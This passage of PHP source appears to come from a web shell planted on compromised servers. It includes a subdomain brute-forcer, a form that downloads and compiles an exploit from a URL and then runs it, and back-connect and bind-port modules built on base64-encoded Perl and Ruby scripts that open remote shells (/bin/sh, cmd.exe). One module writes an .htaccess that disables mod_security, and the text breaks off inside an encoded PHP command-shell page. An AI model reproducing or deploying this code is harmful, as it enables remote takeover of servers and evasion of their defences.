size=2pt> " . $count . " </font><font color=#00dd00 size=2pt>writable directories.</font>\n\r"; echo "</td></tr></table></center></html>";
}

}

} elseif($_GET['do'] == 'subdomainchkrezes') { ?>
<?
{
	echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Subdomain Checker</span><center><br>';
echo'<html><body><center></br>
<form method="post">
<input type="text" name="site" size="30" placeholder="Example.com">
<input type="submit" value="Bypass">
</form>
</font>';


set_time_limit(0);
$subs = array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","lan","phpmyadmin","administrator","mape","isp","shop","rex","podcast","potraga","sensation","igre","foo","api","access","ulaz","pam","sport","pretraga","pricaonica","kuvar","raketa","wwwmobile","s1","s2","foro","s3","box","open","abc","phpbb3","phpbb2","internet","phpbb","whm","mysql","webadmin","adm","admin","admins","agent","aix","recnik","alerts","av","antivirus","app","apps","appserver","archive","as400","auto","backup","banking","bbdd","bbs","bea","beta","blog","catalog","cgi","channel","channels","chat","cisco","client","clients","club","cluster","clusters","code","commerce","community","compaq","conole","consumer","contact","contracts","corporate","ceo","cso","cust","customer","cpanel","data","bd","db2","default","demo","cms","design","desktop","dev","develop","developer","device","dial","digital","dir","directory","disc","discovery","disk","dns","dns1","dns2","dns3","docs","poslovi","prijemni","znanje","mojtim","documents","domain","domains","dominoweb","download","downloads","ecommerce","e-commerce","edi","edu","education","email","enable","engine","engineer","enterprise","slike","galerija","error","event","events","example","exchange","extern","external","extranet","fax","field","finance","firewall","forum","forums","fsp","ftp","ftp2","fw","fw1","gallery","galleries","games","gateway","gopher","guest","gw","hello","helloworld","help","helpdesk","arkiva","lajme","faqe","helponline","hp","ibm","ibmdb","ids","ILMI","film","navigator","nalog","prodavnica","zdravlje","reklamiranje","zivot","images","imap","pomoc","imap4","img","imgs","info","intern","internal","intranet","invalid","iphone","ipsec","irc","ircserver","jobs","ldap","link","linux","lists","listserver","local","localhost","log","logs","login","lotus","mail","mailboxes","mailhost","result","management","manage","manager","map","maps","marketing","device","media","member","members","messenger","mngt","mobile","monitor","multimedia","music","my","names","lojra","albania","bisedo","puka","foto","emra","njohje","vip","egea-tirana","historia","forumi","vesti","administracija","net","new1","new","perkohesisht","netdata","netstats","network","news","nms","nntp","ns","ns1","ns2","ns3","ntp","online","openview","oracle","outlook","page","pages","partner","partners","pda","personal","ph","pictures","pix","pop","pop3","portal","press","print","printer","private","project","projects","proxy","public","ra","radio","raptor","ras","read","register","remote","report","reports","root","router","lister","rwhois","sac","schedules","scotty","search","secret","secure","security","seri","serv","serv2","server","service","services","shop","shopping","site","sms","smtp","smtphost","snmp","snmpd","snort","solaris","1","2","3","4","5","6","7","8","9","0","solutions","support","source","sql","ssl","stats","store","stream","streaming","sun","support","switch","sysback","system","tech","terminal","test","testing","testing123","time","tivoli","training","transfers","uddi","update","upload","uploads","video","vpn","w1","w2","w3","wais","wap","web","webdocs","weblib","weblogic","webmail","webserver","webservices","websphere","whois","wireless","work","world","write","ws","ws1","ws2","ws3","www1","www2","www3","www4","www5","www6","www7","www8","www9","drupal","wordpress","joomla","db","database","love");
if($_POST){
$url = $_POST["site"];
foreach($subs as $sub){
if(!eregi($url, gethostbyname($sub.".".$url))){
echo '<font face="Baskerville Old Face" color="red">[+] '.$sub.".".$url.' : </font><font color="green">'.gethostbyname($sub.".".$url).'</font></br>';
}else{
echo '<font face="Baskerville Old Face" color="red">[+] '.$sub.".".$url.' : Nothing Found</font></br>';
}
}
}
}
	} elseif($_GET['do'] == 'tesexploit') { ?>
<?
{
	echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Exploit</span><center>';
?>
<center>
<span style="font-family: Tahoma, Geneva, sans-serif;font-size: 12px; color: #007700;"><br />Get and execute<br /><br /></span>
<form action="" method="get">
<input type="text" name="exp_url" value="http://site.com/exploit"> Type:
<select name="run">
<option>c++ | .cpp</option>
<option>python | .py</option>
<option>perl | .pl</option>
<option>ruby | .rb</option>
</select>
<input type="hidden" name="action" value="exploit">
<input type="submit" value="Start">
</form>
</center>
<?php
}

if(isset($_GET['exp_url'])){
echo '<center>';
if(function_exists("wget")){
wget($_GET['exp_url']);
echo $_GET['exp_url'].' got in here';
if(function_exists("system")){

if(isset($_GET['run'])){
$run = $_GET['run'];
if($run = 'c++ | .cpp'){
system("gcc -o exploit ".$_GET['exp_url'].";chmod +x exploit;./exploit;");
}
if($run = 'perl | .pl'){
}
if($run = 'python | .py'){
}
if($run = 'ruby | .rb'){
}


}


}
else{
echo 'System command disabled';
}
}
else{
echo('wget disabled');
}
echo '</center>';
}
} elseif($_GET['do'] == 'beko') { ?>
<?
{
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Back Connect</span><center><br>';
if ($_REQUEST['cdirname']){
if(mkdir($_REQUEST['cdirname'],"0777")){alert("Directory Created !");}else{alert("Permission Denied !");}}
function bcn($ipbc,$pbc){
$bcperl="IyEvdXNyL2Jpbi9wZXJsCiMgQ29ubmVjdEJhY2tTaGVsbCBpbiBQZXJsLiBTaGFkb3cxMjAgLSB3
NGNrMW5nLmNvbQoKdXNlIFNvY2tldDsKCiRob3N0ID0gJEFSR1ZbMF07CiRwb3J0ID0gJEFSR1Zb
MV07CgogICAgaWYgKCEkQVJHVlswXSkgewogIHByaW50ZiAiWyFdIFVzYWdlOiBwZXJsIHNjcmlw
dC5wbCA8SG9zdD4gPFBvcnQ+XG4iOwogIGV4aXQoMSk7Cn0KcHJpbnQgIlsrXSBDb25uZWN0aW5n
IHRvICRob3N0XG4iOwokcHJvdCA9IGdldHByb3RvYnluYW1lKCd0Y3AnKTsgIyBZb3UgY2FuIGNo
YW5nZSB0aGlzIGlmIG5lZWRzIGJlCnNvY2tldChTRVJWRVIsIFBGX0lORVQsIFNPQ0tfU1RSRUFN
LCAkcHJvdCkgfHwgZGllICgiWy1dIFVuYWJsZSB0byBDb25uZWN0ICEiKTsKaWYgKCFjb25uZWN0
KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsIGluZXRfYXRvbigkaG9zdCkpKSB7ZGll
KCJbLV0gVW5hYmxlIHRvIENvbm5lY3QgISIpO30KICBvcGVuKFNURElOLCI+JlNFUlZFUiIpOwog
IG9wZW4oU1RET1VULCI+JlNFUlZFUiIpOwogIG9wZW4oU1RERVJSLCI+JlNFUlZFUiIpOwogIGV4
ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAuICJcMCIgeCA0Ow==";
$opbc=fopen("bcc.pl","w");
fwrite($opbc,base64_decode($bcperl));
fclose($opbc);
system("perl bcc.pl $ipbc $pbc") or die("I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode");
}
function wbp($wb){
$wbp="dXNlIFNvY2tldDsKJHBvcnQJPSAkQVJHVlswXTsKJHByb3RvCT0gZ2V0cHJvdG9ieW5hbWUoJ3Rj
cCcpOwpzb2NrZXQoU0VSVkVSLCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKTsKc2V0c29j
a29wdChTRVJWRVIsIFNPTF9TT0NLRVQsIFNPX1JFVVNFQUREUiwgcGFjaygibCIsIDEpKTsKYmlu
ZChTRVJWRVIsIHNvY2thZGRyX2luKCRwb3J0LCBJTkFERFJfQU5ZKSk7Cmxpc3RlbihTRVJWRVIs
IFNPTUFYQ09OTik7CmZvcig7ICRwYWRkciA9IGFjY2VwdChDTElFTlQsIFNFUlZFUik7IGNsb3Nl
IENMSUVOVCkKewpvcGVuKFNURElOLCAiPiZDTElFTlQiKTsKb3BlbihTVERPVVQsICI+JkNMSUVO
VCIpOwpvcGVuKFNUREVSUiwgIj4mQ0xJRU5UIik7CnN5c3RlbSgnY21kLmV4ZScpOwpjbG9zZShT
VERJTik7CmNsb3NlKFNURE9VVCk7CmNsb3NlKFNUREVSUik7Cn0g";
$opwb=fopen("wbp.pl","w");
fwrite($opwb,base64_decode($wbp));
fclose($opwb);
echo getcwd();
system("perl wbp.pl $wb") or die("I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode");
}
function lbp($wb){
$lbp="IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7JHBvcnQ9JEFSR1ZbMF07JHByb3RvPWdldHByb3Rv
YnluYW1lKCd0Y3AnKTskY21kPSJscGQiOyQwPSRjbWQ7c29ja2V0KFNFUlZFUiwgUEZfSU5FVCwg
U09DS19TVFJFQU0sICRwcm90byk7c2V0c29ja29wdChTRVJWRVIsIFNPTF9TT0NLRVQsIFNPX1JF
VVNFQUREUiwgcGFjaygibCIsIDEpKTtiaW5kKFNFUlZFUiwgc29ja2FkZHJfaW4oJHBvcnQsIElO
QUREUl9BTlkpKTtsaXN0ZW4oU0VSVkVSLCBTT01BWENPTk4pO2Zvcig7ICRwYWRkciA9IGFjY2Vw
dChDTElFTlQsIFNFUlZFUik7IGNsb3NlIENMSUVOVCl7b3BlbihTVERJTiwgIj4mQ0xJRU5UIik7
b3BlbihTVERPVVQsICI+JkNMSUVOVCIpO29wZW4oU1RERVJSLCAiPiZDTElFTlQiKTtzeXN0ZW0o
Jy9iaW4vc2gnKTtjbG9zZShTVERJTik7Y2xvc2UoU1RET1VUKTtjbG9zZShTVERFUlIpO30g";
$oplb=fopen("lbp.pl","w");
fwrite($oplb,base64_decode($lbp));
fclose($oplb);
system("perl lbp.pl $wb") or die("I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode");
}

if($_REQUEST['portbw']){
wbp($_REQUEST['portbw']);

}if($_REQUEST['portbl']){
lbp($_REQUEST['portbl']);
}
if($_REQUEST['ipcb'] && $_REQUEST['portbc']){
bcn($_REQUEST['ipcb'],$_REQUEST['portbc']);

}
echo "<p align='center'><font face='Tahoma' color='#007700' size='2pt' /><p align='center'><br>Ip : <input type=text name=ipcb value=".$_SERVER['REMOTE_ADDR'] ."> Port : <input type=text name=portbc value=5555> <input type=submit value=Connect></form>".$formp."<p align='center'><p align='center'><br><font face='Tahoma' color='#009900' size='2pt'> Windows Bind Port</font> <br>Port : <input type=text name=portbw value=5555> <input type=submit value=Connect></form>".$formp."<p align='center'> <br><font face='Tahoma' color='#009900' size='2pt'>Linux Bind Port</font> <br>Port : <input type=text name=portbl value=5555> <input type=submit value=Connect></form><br><br>".$end;exit;
}
} elseif($_GET['do'] == 'rubybckconnnect') { ?>
<?
{
mkdir('rubrub', 0755);
chdir('rubrub');
$antinoooob = ".htaccess";
$morethannn = "$antinoooob";
$diamondd = fopen ($morethannn , 'w') or die ("diamondd a&#231;&#305;lamad&#305;!");
$gloryr = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>";    
fwrite ( $diamondd , $gloryr ) ;
fclose ($diamondd);
//extract ruby reverse script
$vkffhd = 'cmVxdWlyZSAnc29ja2V0Jw0KcmVxdWlyZSAncGF0aG5hbWUnDQogDQpkZWYgdXNhZ2UNCiAgICAgICAgcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KICAgICAgICBwcmludCAicmV2ZXJzZSA6XHJcbiAgcnVieSAiICsgRmlsZS5iYXNlbmFtZShfX0ZJTEVfXykgKyAiIFtwb3J0XSBbaG9zdF1cclxuIg0KZW5kDQogDQpkZWYgc3Vja3MNCiAgICAgICAgc3Vja3MgPSBmYWxzZQ0KICAgICAgICBpZiBSVUJZX1BMQVRGT1JNLmRvd25jYXNlLm1hdGNoKCdtc3dpbnx3aW58bWluZ3cnKQ0KICAgICAgICAgICAgICAgIHN1Y2tzID0gdHJ1ZQ0KICAgICAgICBlbmQNCiAgICAgICAgcmV0dXJuIHN1Y2tzDQplbmQNCiANCmRlZiByZWFscGF0aChzdHIpDQogICAgICAgIHJlYWwgPSBzdHINCiAgICAgICAgaWYgRmlsZS5leGlzdHM/KHN0cikNCiAgICAgICAgICAgICAgICBkID0gUGF0aG5hbWUubmV3KHN0cikNCiAgICAgICAgICAgICAgICByZWFsID0gZC5yZWFscGF0aC50b19zDQogICAgICAgIGVuZA0KICAgICAgICBpZiBzdWNrcw0KICAgICAgICAgICAgICAgIHJlYWwgPSByZWFsLmdzdWIoL1wvLywiXFwiKQ0KICAgICAgICBlbmQNCiAgICAgICAgcmV0dXJuIHJlYWwNCmVuZA0KIA0KaWYgQVJHVi5sZW5ndGggPT0gMQ0KICAgICAgICBpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQogICAgICAgICAgICAgICAgcG9ydCA9IEludGVnZXIoQVJHVlswXSkNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHVzYWdlDQogICAgICAgICAgICAgICAgcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCiAgICAgICAgICAgICAgICBleGl0DQogICAgICAgIGVuZA0KICAgICAgICBzZXJ2ZXIgPSBUQ1BTZXJ2ZXIubmV3KCIiLCBwb3J0KQ0KICAgICAgICBzID0gc2VydmVyLmFjY2VwdA0KICAgICAgICBwb3J0ID0gcy5wZWVyYWRkclsxXQ0KICAgICAgICBuYW1lID0gcy5wZWVyYWRkclsyXQ0KICAgICAgICBzLnByaW50ICIqKiogY29ubmVjdGVkXHJcbiINCiAgICAgICAgcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQogICAgICAgIGJlZ2luDQogICAgICAgICAgICAgICAgaWYgbm90IHN1Y2tzDQogICAgICAgICAgICAgICAgICAgICAgICBmID0gcy50b19pDQogICAgICAgICAgICAgICAgICAgICAgICBleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICBzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIGxpbmUgPSBzLmdldHMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyrbQvDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBsaW5lLmNob21wID09ICIiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGluZSA9fiAvY2QgLiovaQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpbmUgPSByZWFscGF0aChsaW5lKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaXIuY2hkaXIobGluZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzaWYgbGluZSA9fiAvXHc6LiovaQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUuY2hvbXApDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIERpci5jaGRpcihsaW5lLmNob21wKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJTy5wb3BlbihsaW5lLCJyIil7fGlvfHMucHJpbnQgaW8ucmVhZCArICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiJ9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgZW5kDQogICAgICAgIHJlc2N1ZSBlcnJvckJybw0KICAgICAgICAgICAgICAgIHB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KICAgICAgICBlbnN1cmUNCiAgICAgICAgICAgICAgICBzLmNsb3NlDQogICAgICAgICAgICAgICAgcyA9IG5pbA0KICAgICAgICBlbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCiAgICAgICAgaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KICAgICAgICAgICAgICAgIHBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQogICAgICAgICAgICAgICAgaG9zdCA9IEFSR1ZbMV0NCiAgICAgICAgZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KICAgICAgICAgICAgICAgIHBvcnQgPSBJbnRlZ2VyKEFSR1ZbMV0pDQogICAgICAgICAgICAgICAgaG9zdCA9IEFSR1ZbMF0NCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHVzYWdlDQogICAgICAgICAgICAgICAgcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCiAgICAgICAgICAgICAgICBleGl0DQogICAgICAgIGVuZA0KICAgICAgICBzID0gVENQU29ja2V0Lm5ldygiI3tob3N0fSIsIHBvcnQpDQogICAgICAgIHBvcnQgPSBzLnBlZXJhZGRyWzFdDQogICAgICAgIG5hbWUgPSBzLnBlZXJhZGRyWzJdDQogICAgICAgIHMucHJpbnQgIioqKiBjb25uZWN0ZWRcclxuIg0KICAgICAgICBwdXRzICIqKiogY29ubmVjdGVkIDogI3tuYW1lfToje3BvcnR9Ig0KICAgICAgICBiZWdpbg0KICAgICAgICAgICAgICAgIGlmIG5vdCBzdWNrcw0KICAgICAgICAgICAgICAgICAgICAgICAgZiA9IHMudG9faQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhlYyBzcHJpbnRmKCIvYmluL3NoIC1pIFw8XCYlZCBcPlwmJWQgMlw+XCYlZCIsIGYsIGYsIGYpDQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQogICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSBsaW5lID0gcy5nZXRzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIGVycm9yQnJvIGlmIGxpbmUgPX4gL15kaWVccj8kLw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxpbmUgPX4gL2NkIC4qL2kNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpbmUgPSBsaW5lLmdzdWIoL2NkIC9pLCAnJykuY2hvbXANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEZpbGUuZGlyZWN0b3J5rbhsaW5lKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaW5lID0gcmVhbHBhdGgobGluZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRGlyLmNoZGlyKGxpbmUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEZpbGUuZGlyZWN0b3J5rbhsaW5lLmNob21wKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaXIuY2hkaXIobGluZS5jaG9tcCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICByZXNjdWUgZXJyb3JCcm8NCiAgICAgICAgICAgICAgICBwdXRzICIqKiogI3tuYW1lfToje3BvcnR9IGRpc2Nvbm5lY3RlZCINCiAgICAgICAgZW5zdXJlDQogICAgICAgICAgICAgICAgcy5jbG9zZQ0KICAgICAgICAgICAgICAgIHMgPSBuaWwNCiAgICAgICAgZW5kDQplbHNlDQogICAgICAgIHVzYWdlDQogICAgICAgIGV4aXQNCmVuZA==';

$cvcvcv = fopen("revbackk.rb" ,"w+");
$write = fwrite ($cvcvcv ,base64_decode($vkffhd));
fclose($cvcvcv);
chmod("revbackk.rb",0755);

//extract php command shell
$merdeeeee = 'PGh0bWw+PGhlYWQ+PHRpdGxlPkFub25HaG9zdCBSdWJ5IEJhY2sgQ29ubmVjdCBTaGVsbDwvdGl0bGU+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3MTQuMHp6MC5jb20vMjAxNC8wNi8wNC8yMS8zOTY1NTQzOTQucG5nIiB0eXBlPSJpbWFnZS94LWljb24iIC8+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmJvZHl7IGJhY2tncm91bmQtY29sb3I6ICMyMjIyMjIgIWltcG9ydGFudDsgY29sb3I6ICMwMDk5MDA7IHRleHQtc2hhZG93OiMwMDAgMHB4IDJweCA3cHg7fSAgICAgIGF7dGV4dC1kZWNvcmF0aW9uOm5vbmU7IGZvbnQtZmFtaWx5OiBUYWhvbWEsIEdlbmV2YTsgY29sb3I6IzAwNzcwMDsgcGFkZGluZzoycHggMnB4O30gICAgICBhOmhvdmVye2NvbG9yOiMwMDk5MDA7IHRleHQtc2hhZG93OiMwMGZmMDAgMHB4IDBweCAzcHg7fQkgIC5hcmVhIHsgY29sb3I6ICMwMGJiMDA7IGZvbnQtc2l6ZTogOXB0OyB0ZXh0LXNoYWRvdzojMDAwMDAwIDBweCAycHggN3B4OyBib3JkZXI6IHNvbGlkIDBweCAjMDA3NzAwOyBiYWNrZ3JvdW5kLWNvbG9yOnRyYW5zcGFyZW50OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDA5OTAwOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDAsMTE5LDApIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogcmdiKDAsMTE5LDApIDBweCAwcHggNHB4OyB9CSAgaW5wdXRbdHlwZT1zdWJtaXRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA3NzA7ICBmb250LXdlaWdodDogYm9sZDsgdGV4dC1hbGlnbjogY2VudGVyOyAgdGV4dC1zaGFkb3c6IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4zKTsgIGJhY2tncm91bmQ6ICNhZWFlYWU7ICBiYWNrZ3JvdW5kLWNsaXA6IHBhZGRpbmctYm94OyAgYm9yZGVyOiAxcHggc29saWQgIzI4NDQ3MzsgIGJvcmRlci1ib3R0b20tY29sb3I6ICMyMjNiNjY7ICBib3JkZXItcmFkaXVzOiA0cHg7ICBjdXJzb3I6IHBvaW50ZXI7ICBiYWNrZ3JvdW5kLWltYWdlOi13ZWJraXQtbGluZWFyLWdyYWRpZW50KHRvcCwgI2VhZWFlYSwgI2QwZDBkMCk7ICBiYWNrZ3JvdW5kLWltYWdlOiAtbW96LWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOyAgYmFja2dyb3VuZC1pbWFnZTogLW8tbGluZWFyLWdyYWRpZW50KHRvcCwgI2VhZWFlYSwgI2QwZDBkMCk7ICBiYWNrZ3JvdW5kLWltYWdlOiBsaW5lYXItZ3JhZGllbnQodG8gYm90dG9tLCAjZWFlYWVhLCAjZDBkMGQwKTsgIC13ZWJraXQtYm94LXNoYWRvdzogaW5zZXQgMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjUpLCBpbnNldCAwIDAgN3B4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC40KSwgMCAxcHggMXB4IHJnYmEoMCwgMCwgMCwgMC4xNSk7ICBib3gtc2hhZG93OiBpbnNldCAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSksIGluc2V0IDAgMCA3cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjQpLCAwIDFweCAxcHggcmdiYSgwLCAwLCAwLCAwLjE1KTsgfSBpbnB1dFt0eXBlPXRleHRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA5OTAwOyB0ZXh0LXNoYWRvdzogIzc3Nzc3NyAwcHggMHB4IDNweDsgYm9yZGVyOiAxcHggc29saWQgIzAwNzcwMDsgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMDc3MDA7ICAgIHBhZGRpbmc6IDNweDsgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsgICAtbW96LWJvcmRlci1yYWRpdXM6IDRweDsgICBib3JkZXItcmFkaXVzOiA0cHg7ICAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoODUsODUsODUpIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogcmdiKDg1LDg1LDg1KSAwcHggMHB4IDRweDt9IGlucHV0W3R5cGU9c3VibWl0XTpob3ZlciwgaW5wdXRbdHlwZT10ZXh0XTpob3ZlcnsgY29sb3I6ICNmZmZmZmY7IHRleHQtc2hhZG93OiAjMDA2NjAwIDBweCAwcHggNHB4OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDBkZDAwOyBib3JkZXI6IDFweCBzb2xpZCAjMDBkZDAwOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiYSgwLDExOSwwKSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6IHJnYmEoMCwxMTksMCkgMHB4IDBweCA0cHg7fSBzZWxlY3R7IHBhZGRpbmc6IDNweDsgd2lkdGg6IDE2MnB4OyBjb2xvcjogIzAwYWEwMDsgdGV4dC1zaGFkb3c6IzAwMCAwcHggMnB4IDdweDsgYm9yZGVyOiAxcHggc29saWQgIzAwNzcwMDsgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwYWEwMDsgIHBhZGRpbmc6IDNweDsgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsgICAtbW96LWJvcmRlci1yYWRpdXM6IDRweDsgICBib3JkZXItcmFkaXVzOiA0cHg7ICAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoODUsIDg1LCA4NSkgMHB4IDBweCA0cHg7ICAgLW1vei1ib3gtc2hhZG93OiByZ2IoODUsIDg1LCA4NSkgMHB4IDBweCA0cHg7fSBzZWxlY3Q6aG92ZXJ7IGJvcmRlcjogMXB4IHNvbGlkICMwMGRkMDA7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMGRkMDA7ICAgcGFkZGluZzogM3B4OyAgIC